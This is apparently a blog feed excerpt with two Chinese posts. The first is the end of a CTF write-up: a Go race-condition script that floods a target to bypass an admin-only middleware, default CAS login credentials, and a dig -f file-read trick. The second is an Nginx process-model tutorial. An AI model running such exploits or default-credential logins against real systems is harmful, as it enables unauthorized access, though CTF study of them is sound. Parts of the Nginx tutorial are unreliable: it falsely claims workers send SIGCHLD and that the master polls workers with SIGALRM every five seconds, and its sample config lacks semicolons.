handlers &#123;</span><br><span class="line">          c.mws = append(c.mws, getMWFromHandler(h))</span><br><span class="line">       &#125;</span><br><span class="line">       c.run()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这块再结合鉴权用中间件，思路就出来了：我们可以构造三个请求，让第一个非 <code>/flag</code> 请求的后两个 Handler 被第二个 <code>/flag</code> 请求覆盖，再发第三个请求覆盖 <code>/flag</code> 的第一个 Handler 取消 adminOnly 的限制，这样就能实现绕过 <code>secureFlagMiddleware</code> 获取 flag。</p><p>之后 Baimeow 搓了个脚本：</p><blockquote><p>“触发条件比较苛刻，脚本有点讲究的，必须让最大量的流量在路由部分，且保持两类流量比例”</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var url = &quot;TARGET_IP&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    limiter1 := make(chan struct&#123;&#125;, 64)</span><br><span class="line">    limiter2 := make(chan struct&#123;&#125;, 32)</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          limiter1 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendSlash() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">          &lt;-limiter1</span><br><span class="line">          &lt;-limiter2</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    var i = 0</span><br><span class="line">    go func() &#123;</span><br><span class="line">       for &#123;</span><br><span class="line">          limiter2 &lt;- struct&#123;&#125;&#123;&#125;</span><br><span class="line">          i++</span><br><span class="line">          fmt.Println(&quot;try&quot;, i)</span><br><span class="line">          go func() &#123;</span><br><span class="line">             if SendFlag() &#123;</span><br><span class="line">                os.Exit(0)</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;()</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    select &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendSlash() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func SendFlag() bool &#123;</span><br><span class="line">    get, err := http.Get(url + &quot;/flag&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">       log.Println(err)</span><br><span class="line">    &#125;</span><br><span class="line">    if get != nil &#123;</span><br><span class="line">       defer get.Body.Close()</span><br><span class="line">       return checkBody(get.Body)</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func checkBody(rd io.Reader) bool &#123;</span><br><span class="line">    data, _ := io.ReadAll(rd)</span><br><span class="line">    if data == nil &#123;</span><br><span class="line">       return false</span><br><span class="line">    &#125;</span><br><span class="line">    if strings.Contains(string(data), &quot;aliyunctf&#123;&quot;) &#123;</span><br><span class="line">       fmt.Println(string(data))</span><br><span class="line">       return true</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以关注下脚本中高亮的部分，是基于 channel 实现的限流器，如上文所说将 <code>/</code> 和 <code>/flag</code> 的请求比例控制在 2:1。</p><p>:::info 具体是如何控制不同请求比例的呢？</p><p><code>limiter1</code> 和 <code>limiter2</code> 是两个无缓冲的通道，它们的容量分别为 64 和 32。这意味着这两个通道最多可以同时容纳 64 和 32 个空结构体。</p><p>当一个 goroutine 尝试向一个已满的通道发送数据时，这个 goroutine 会被阻塞，直到有其他 goroutine 从该通道接收数据，使得通道有足够的空间来存放新的数据。</p><p>同样，当一个 goroutine 尝试从一个空的通道接收数据时，这个 goroutine 也会被阻塞，直到有其他 goroutine 向该通道发送数据。</p><p>因此，这两个通道就像是两个限流器，它们限制了同时运行的 <code>SendSlash()</code> 和 <code>SendFlag()</code> 的数量。当这两个函数的数量达到通道的容量时，新的函数调用会被阻塞，直到有正在运行的函数完成。</p><p>:::</p><h3 id="easyCAS"><a href="#easyCAS" class="headerlink" title="easyCAS"></a>easyCAS</h3><blockquote><p>怎么网上都是 4.X 的漏洞，版本 5.X 没漏洞了吗，可是都是六年前的了，真的没问题吗，不管了，那我就搭起来看看吧，反正没漏洞密码也懒得改了。嗷~对了，还要调一下代码，开一下调试功能。</p></blockquote><p><a href="https://github.com/apereo/cas">CAS 项目地址</a>，题目环境对应版本源码：<a href="https://github.com/apereo/cas-overlay-template/tree/5.3">release 5.3.16</a>，可以在本地起环境。</p><p>有了源码之后可以在配置文件中遭到默认用户密码，直接可以登进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./gradlew duct</span><br><span class="line">    -Pduct.cas.1=https://node1.example.org/cas \</span><br><span class="line">    -Pduct.cas.2=https://node2.example.org/cas \</span><br><span class="line">    -Pduct.cas.3=https://node3.example.org/cas \</span><br><span class="line">    -Pduct.cas.4=https://node4.example.org/cas \</span><br><span class="line">    -Pduct.service=https://apereo.github.io \</span><br><span class="line">    -Pduct.username=casuser \</span><br><span class="line">    -Pduct.password=Mellon</span><br></pre></td></tr></table></figure><p>:::danger</p><p>Working in progress…</p><p>:::</p><h2 id="About-ctf"><a href="#About-ctf" class="headerlink" title="About.ctf"></a>About.ctf</h2><h3 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web 签到"></a>Web 签到</h3><p>搞过 Web 开发的肯定都了解 CDN。全称 Content Delivery Network，即内容分发网络，这种技术通过在全球多个地点部署服务器节点来优化内容的交付。这些节点缓存网页静态资源，使得用户可以从地理上更接近自己的位置获取这些内容，从而减少延迟，提高加载速度和用户体验。</p><p>:::tip CDN的工作原理</p><p>当用户请求特定的内容时，CDN 的 DNS 系统会将请求重定向到最近的服务器节点。这个节点会提供请求的内容，如果该节点没有缓存该内容，它会从源服务器或其他节点获取内容，然后提供给用户。这个过程减少了数据传输的距离，提高了速度和效率。</p><p>:::</p><p>在处理 CDN 时，我们就常用 <code>dig</code>，因为它可以帮助我们验证 CDN 的 DNS 配置和性能。</p><p><code>dig</code> 本质上是个 DNS 查询工具，并不是为了 CDN 技术而开发，但它确实能帮开发者们获取 CDN 相关信息，比如查询 CDN 缓存状态、检测性能以及排查问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [server] [name] [type]</span><br></pre></td></tr></table></figure><p>最简单的使用就是后面跟 domain，这里以该站点域名为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">dig ma5hr00m.top</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--------------</span></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu &lt;&lt;&gt;&gt; ma5hr00m.top</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 24018</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 65494</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;ma5hr00m.top.                  IN      A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">ma5hr00m.top.           600     IN      A       123.206.118.236</span><br><span class="line"></span><br><span class="line">;; Query time: 252 msec</span><br><span class="line">;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)</span><br><span class="line">;; WHEN: Tue May 07 20:40:39 CST 2024</span><br><span class="line">;; MSG SIZE  rcvd: 5</span><br></pre></td></tr></table></figure><p>其他细致用法去看 help 文档。这道题目里是利用了 <code>-f</code> 参数，当 dig 使用该参数时，可以从指定文件中读取 domain 列表并逐个查询，利用这个参数就能读取指定文件内容。</p><h3 id="Pastbin-1"><a href="#Pastbin-1" class="headerlink" title="Pastbin"></a>Pastbin</h3><p>Pastebin 是一种常见的在线内容托管服务，它允许用户在网站上存储（粘贴）纯文本，如代码片段，并生成一个网址。打开这个网址就可以看到对应的文字。这个服务通常用于快速共享文本或代码片段，尤其是在开发社区中非常流行。用户可以选择文本的类型（例如代码所属的编程语言）、保存时间（如 1 天、7 天、30 天或阅后即销毁等）以及分享者的昵称等信息。</p><blockquote><p>说实话没用过，感觉这个需求直接被开发文档给吃掉了，没什么必要搞这种服务。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx进程模型概述</title>
      <link href="/2024/02/19/2024/overview-of-nginx-process-model/"/>
      <url>/2024/02/19/2024/overview-of-nginx-process-model/</url>
      
        <content type="html"><![CDATA[<p>Nginx 平时一直有在用，但说实话，对其工作原理一直没有深入了解。那不如从现在开始了解，之后会慢慢更。先说说进程模型。</p><h2 id="发展"><a href="#发展" class="headerlink" title="发展"></a>发展</h2><p>Nginx 的开发始于 2002 年，由 Igor Sysoev 发起，最初是为了解决 C10K 问题，即如何让一个服务器同时处理超过一万个客户端连接。</p><p>第一个公开版本发布于 2004 年 10 月。自此，Nginx 此开始了它的快速发展。Nginx 目前是世界上使用最多的 Web 服务器之一，根据 Netcraft 的统计，截至 2024 年 2 月，Nginx 占据了全球 Web 服务器市场的 32.8% 的份额，仅次于 Apache。</p><h2 id="安装与管理"><a href="#安装与管理" class="headerlink" title="安装与管理"></a>安装与管理</h2><p>主流 Linux 发行版的包管理工具都支持下载 nginx，这里以 Manjaro 为例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S nginx</span><br></pre></td></tr></table></figure><p>Nginx 可通过<code>-s</code>参数响应一些自带的信号，比如：</p><ul><li><code>stop</code>：立即关闭</li><li><code>quit</code>：正常关闭</li><li><code>reload</code>：重新加载配置文件</li><li><code>reopen</code>：重新打开日志文件</li></ul><p>例如，当我们在<code>etc/nginx/conf.d</code>中修改配置文件添加 Web 服务时，改动内容并不会直接生效，需要我们重启 nginx 服务或者使用<code>-s reload</code>指令传递重新加载配置文件的信号。</p><p>此外，我们可以通过<code>systemctl</code>等指令管理本地的 Nginx 服务，比如最常见的检查 Nginx 状态的指令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl status nginx</span><br></pre></td></tr></table></figure><h2 id="Nginx配置文件结构"><a href="#Nginx配置文件结构" class="headerlink" title="Nginx配置文件结构"></a>Nginx配置文件结构</h2><p>在正式介绍之前，我想要先从 nginx 配置文件入手，这可能会更加便于理解，毕竟配置文件是我们接触 nginx 最直接的地方。</p><p>Linux 下 nginx 配置文件的默认位置是在<code>/etc/nginx/nginx.conf</code>，这里先举一个简单的例子：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全局块</span></span><br><span class="line"><span class="attribute">user</span>  nobody; <span class="comment"># 指定运行nginx服务的用户和用户组</span></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>; <span class="comment"># 指定工作线程数</span></span><br><span class="line"><span class="attribute">error_log</span>  logs/<span class="literal">error</span>.log; <span class="comment"># 指定错误日志的路径和级别</span></span><br><span class="line"><span class="attribute">pid</span>        logs/nginx.pid; <span class="comment"># 指定pid文件的路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># events块</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>; <span class="comment"># 指定每个工作进程可以同时开启的最大连接数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># http块</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment"># http全局块</span></span><br><span class="line">    <span class="attribute">include</span>       mime.types; <span class="comment"># 引入MIME-Type定义文件</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream; <span class="comment"># 设置默认的MIME-Type</span></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>; <span class="comment"># 开启sendfile传输文件的优化</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>; <span class="comment"># 设置连接超时时间</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># server块</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment"># server全局块</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8000</span>; <span class="comment"># 监听8000端口</span></span><br><span class="line">        <span class="attribute">server_name</span>  localhost; <span class="comment"># 设置虚拟主机的名称</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># location块</span></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html; <span class="comment"># 设置根目录的路径</span></span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm; <span class="comment"># 设置默认的首页文件</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># location块</span></span><br><span class="line">        <span class="section">location</span> /images &#123;</span><br><span class="line">            <span class="attribute">root</span>   /data; <span class="comment"># 设置图片资源的路径</span></span><br><span class="line">            <span class="attribute">autoindex</span> <span class="literal">on</span>; <span class="comment"># 开启目录浏览功能</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># location块</span></span><br><span class="line">        <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">            <span class="attribute">root</span>           html; <span class="comment"># 设置PHP文件的路径</span></span><br><span class="line">            <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>; <span class="comment"># 设置PHP-FPM的地址和端口</span></span><br><span class="line">            <span class="attribute">fastcgi_index</span>  index.php; <span class="comment"># 设置默认的PHP文件</span></span><br><span class="line">            <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  /scripts<span class="variable">$fastcgi_script_name</span>; <span class="comment"># 设置PHP脚本的完整路径</span></span><br><span class="line">            <span class="attribute">include</span>        fastcgi_params; <span class="comment"># 引入fastcgi的配置文件</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>全局块：从开始到<code>events</code>块之间的部分，主要设置一些影响 nginx 服务器整体运行的配置指令，例如<code>user</code>，<code>worker_processes</code>，<code>error_log</code>，<code>pid</code>等。</li><li><code>events</code>块：涉及的指令主要影响 nginx 服务器与用户的网络连接，例如<code>worker_connections</code>，<code>accept_mutex</code>，<code>multi_accept</code>，<code>use</code>等。</li><li><code>http</code>块：包含<code>http</code>全局块和多个<code>server</code>块，代理、缓存和日志定义等绝大多数的功能和第三方模块的配置都可以放在这个块中。<code>http</code>全局块是不包含在<code>server</code>块中的部分，主要设置一些影响<code>http</code>协议的配置指令，例如<code>include</code>，<code>default_type</code>等。<code>server</code>块是虚拟主机的配置，每个<code>server</code>块可以包含<code>server</code>全局块和多个<code>location</code>块。<code>server</code>全局块是不包含在<code>location</code>块中的部分，主要设置一些影响虚拟主机的配置指令，例如<code>listen</code>，<code>server_name</code>等。<code>location</code>块是 URL 匹配的配置，每个<code>location</code>块可以包含一些针对特定请求的处理规则，例如<code>root</code>，<code>index</code>，<code>proxy_pass</code>等。</li></ul><p>从方便理解的角度，每个<code>server</code>块就对应一个应用，而<code>location</code>可以理解为应用对应的路由。一般情况下，我们想要在自己的服务器中新增某个 Web 应用配置，就在<code>http</code>块中添加<code>server</code>块即可。</p><p>你可以尝试在 nginx 默认端口为 80 的<code>server</code>块中添加下面这个<code>location</code>块：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="attribute">default_type</span> text/plain</span><br><span class="line">    return <span class="number">200</span> <span class="string">&quot;pong&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>退出保存，使用<code>nginx -s reload</code>重新加载配置文件，使用<code>curl</code>或在浏览器中请求<code>http://ocalhost/ping</code>，即可得到返回的<code>pong</code>响应数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost/ping <span class="comment"># pong</span></span><br></pre></td></tr></table></figure><h2 id="工作模式概述"><a href="#工作模式概述" class="headerlink" title="工作模式概述"></a>工作模式概述</h2><p>在正式开始 Nginx 进程模型的介绍之前，还需要了解下 nginx 的基本工作模式是怎样的。</p><p>Nginx 服务启动后，会创建一个 master 主进程，该主进程在进行一部分初始化工作后，会产生一个或多个工作进程 worker；收到来自客户端的请求后，nginx 可能涉及与后端服务器的通信，它可以将收到的 http 请求代理转发到目标服务器，由专门的后端服务器处理数据。</p><p>同时，为了提高对请求的响应效率，降低服务器受到的网络压力，nginx 采用了缓存机制，将历史应答数据缓存到本地，保障了客户端对缓存文件的快速访问。</p><h2 id="进程模型"><a href="#进程模型" class="headerlink" title="进程模型"></a>进程模型</h2><p>Nginx 采用了 master-worker 进程模型。相比于 apache 采用的传统多进模型，nginx 的进程模型有一些显著的优势：</p><ul><li>Master-worker 异步非阻塞的特点允许 nginx 在高并发下保持低资源低消耗高性能，同时也提高了服务的稳定性，单个 workder 进程出现异常不影响其他 worker 和 master 的运行；</li><li>实现了热部署，即在不重启 nginx 服务的前提下重新加载配置文件；</li><li>……</li></ul><p><img src="https://img.ma5hr00m.top/blog/20240229225629.png" alt="20240229225629"></p><h3 id="master-进程"><a href="#master-进程" class="headerlink" title="master 进程"></a>master 进程</h3><p>master 模块负责接收外部信号，在根据信号的不同管理 worker 模块以实现对应的功能。master 模块本身不会处理网络请求，它只是作为一个调度者，作为用户与 worker 之间的桥梁而存在。</p><p>在 nginx 服务初始化时，master 会读取并解析配置文件，出现错误就报告并推出。我们可以使用<code>-t</code>参数主动检查配置文件是否存在错误，以确保不会重启 nginx 失败：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> nginx -t</span><br></pre></td></tr></table></figure><p>在运行过程中，master 进程也会监控 worker 进程运行状态、如果 worker 模块出现异常，master 就会<code>fork()</code>一个新的 worker 进程，保证整个 nginx 服务正常运行。</p><p>那现在，我们会想知道 master 进程具体是如何管理 worker 进程的呢 🤔️</p><h3 id="master-管理-worker"><a href="#master-管理-worker" class="headerlink" title="master 管理 worker"></a>master 管理 worker</h3><p>master 进程通过信号量机制（Semaphore Mechanism）和定时器机制（Timer Mechanism）来监控并管理 worker 进程。</p><p>信号量机制（semaphore mechanism）是一种用于实现进程间同步和互斥的方法，它使用一个整数变量来表示系统中某种资源的数量或状态，进程可以通过原子操作（atomic operation）来增加或减少信号量的值，从而实现对资源的请求和释放。</p><p>nginx 的 master 模块和 worker 模块之间通过信号（signal）来实现同步和通信，信号是一种用于进程间交互的软件中断，它可以用来传递一些简单的信息或命令。nginx 使用了一些预定义的信号，比如<code>SIGCHLD</code>、<code>SIGALRM</code>、<code>SIGTERM</code>、<code>SIGQUIT</code>、<code>SIGHUP</code>、<code>SIGUSR1</code>等，每个信号都有特定的含义和作用。</p><ul><li>当 worker 模块退出或者崩溃时，它会向 master 模块发送<code>SIGCHLD</code>信号，通知 master 模块有子进程已经终止。master 模块在收到<code>SIGCHLD</code>信号后，会调用<code>waitpid()</code>函数来回收子进程的资源，并检查子进程的退出码，如果是非正常退出，就会重新<code>fork()</code>一个新的 worker 模块，保证服务的可用性。</li><li>当 master 模块需要重启或者升级时，它会向 worker 模块发送<code>SIGTERM</code>或者<code>SIGQUIT</code>信号，要求 worker 模块正常关闭或者立即终止。worker 模块在收到这些信号后，会停止接受新的请求，并处理完已经接受的请求，然后退出。master 模块在收到所有 worker 模块的<code>SIGCHLD</code>信号后，会重新加载配置文件，并启动新的 worker 模块。</li><li>当 master 模块需要重新加载配置文件或者重新打开日志文件时，它会向 worker 模块发送<code>SIGHUP</code>或者<code>SIGUSR1</code>信号，要求 worker 模块重新读取配置文件或者重新打开日志文件。worker 模块在收到这些信号后，会先关闭旧的配置文件或者日志文件，然后打开新的配置文件或者日志文件，并继续处理请求。</li></ul><p>而定时器机制（timer mechanism）是一种用于实现进程间通信和调度的方法，它使用一个计数器来表示系统中某种事件的发生时间或间隔，进程可以通过设置或取消定时器来触发或取消某种动作，从而实现对事件的响应和控制。</p><p>nginx 则使用了<code>SIGALRM</code>信号来实现定时器的功能。</p><ul><li>当 master 模块启动时，它会设置一个定时器，每隔一定的时间（默认是 5 秒），就会向 worker 模块发送 <code>SIGALRM</code>信号，要求 worker 模块向 master 模块报告自己的状态，比如是否存活、是否忙碌、是否有异常等。master 模块在收到 worker 模块的回应后，会更新 worker 模块的状态，并根据 worker 模块的状态来调整定时器的间隔，如果 worker 模块频繁退出或者出错，就会缩短定时器的间隔，反之则会延长定时器的间隔。</li><li>当 master 模块收到<code>SIGALRM</code>信号时，它会检查 worker 模块是否存活，如果发现有 worker 模块已经死亡，就会重新<code>fork()</code>一个新的 worker 模块，保证服务的可用性。master 模块还会检查 worker 模块是否忙碌，如果发现有 worker 模块长时间没有处理请求，就会认为 worker 模块已经卡死，然后向 worker 模块发送<code>SIGKILL</code>信号，强制终止 worker 模块，并重新<code>fork()</code>一个新的 worker 模块，保证服务的可用性。</li></ul><h3 id="worker-进程"><a href="#worker-进程" class="headerlink" title="worker 进程"></a>worker 进程</h3><p>worker 接受 master 的调度，负责处理客户端的连接和请求。客户端的请求完全由 worker 处理，而且请求与 worker 是一一对应的关系。同时，worker 进程之间都是平等关系。</p><p>这句话可以引出来一个问题：worker 之间是平等的关系，每条请求只由单个 worker处理，但接收请求时会存在多个 worker，那 master 是怎么决定让哪个 worker 去处理当前请求的呢？</p><h3 id="worker-工作流程"><a href="#worker-工作流程" class="headerlink" title="worker 工作流程"></a>worker 工作流程</h3><p>在开始之前，有必要先介绍 nginx 的 accepy_mutex 机制，该机制有效的避免了惊群效应（thundering herd problem）和锁队列（lock convoy）问题，而这些问题会导致 nginx 的性能下降和资源浪费。</p><p>accept_mutex 是一个互斥锁（mutex），它可以保证在同一时刻，只有一个 worker 可以接受新连接，其他 worker 则会等待或者处理已有的连接。</p><p>accept_mutex 机制的开启和关闭可以通过配置文件中的<code>accept_mutex</code>指令来控制，它的默认值是<code>off</code>。同时，还会有一个<code>accept_mutex_delay</code>时间参数，它指定了在另一个 worker 正在接受新连接的情况下，worker 尝试重新开始接受新连接的最长时间，它的默认值是<code>500ms</code>。这个参数可以避免工作进程频繁地抢夺 accept_mutex，从而减少系统开销。</p><p>好，到这里就差不多。现在介绍 worker 工作流程。</p><p>在 nginx 服务器启动时，会先创建一个 master 进程，master 会先建立好需要<code>listen</code>的 socket（listenfd）之后，再根据配置文件中<code>worker_process</code>指令创建指定数量的 worker 进程，用于处理请求。然后，master 会创建 accept_mutex，并把它传递给 worker。</p><p>每个 worker 都会初始化事件模块（event module）和连接模块（connection module），事件模块负责监听和处理事件，连接模块负责管理连接。worker 会根据配置文件中的<code>use</code>指令，选择最合适的事件通知机制,再根据配置文件中的<code>worker_connections</code>指令，创建一个连接池（connection pool），并分配一定数量的连接（connection）给事件模块，每个连接都有一个读事件（read event）和一个写事件（write event）。</p><p>当有新连接到来时，事件模块会通知 worker，然后所有 worker 会来抢唯一的 accept_mutex，抢到 mutex 的 worker 进程就会注册 listenfd 读事件，在读事件里调用 accept 接受该连接。当 worker 接受完新连接后，它会释放 accept_mutex，并处理新连接的请求。</p><p>那没抢到 mutex 的 worker 会做什么呢？它们会等待<code>accept_mutex_delay</code>的时间，如果在这段时间内没有其他 worker 获得 mutex，它们就会再次尝试获取 mutex，并重复上述过程；如果在这段时间内有其他 worker 获得 mutex，那么等待的 worker 就会放弃，转而继续处理已有的连接或者进入休眠状态。</p><p>抢到 mutex 的 worker 会进入事件循环（event loop），不断地检查事件队列中是否有就绪的事件，如果有，就调用相应的事件处理函数。对于读事件，事件处理函数会读取客户端发送的数据，并根据数据的类型，调用相应的模块来处理请求，例如，如果是 HTTP 请求，就调用 HTTP 模块（HTTP module）；如果是邮件请求，就调用邮件模块（mail module）……对于写事件，事件处理函数会发送数据给客户端，并根据数据的状态，决定是否关闭连接或者继续处理请求。</p><p>处理完一个连接或者请求时，worker 会把连接放回连接池中，等待下一次使用，或者释放连接，以便其他工作进程使用。</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Netcraft"><a href="#Netcraft" class="headerlink" title="Netcraft"></a>Netcraft</h3><p>Netcraft 是一家英国的网络安全公司，成立于 1995 年。该公司主要提供互联网基础架构，网络安全，以及网站评测等服务。 其中，Netcraft 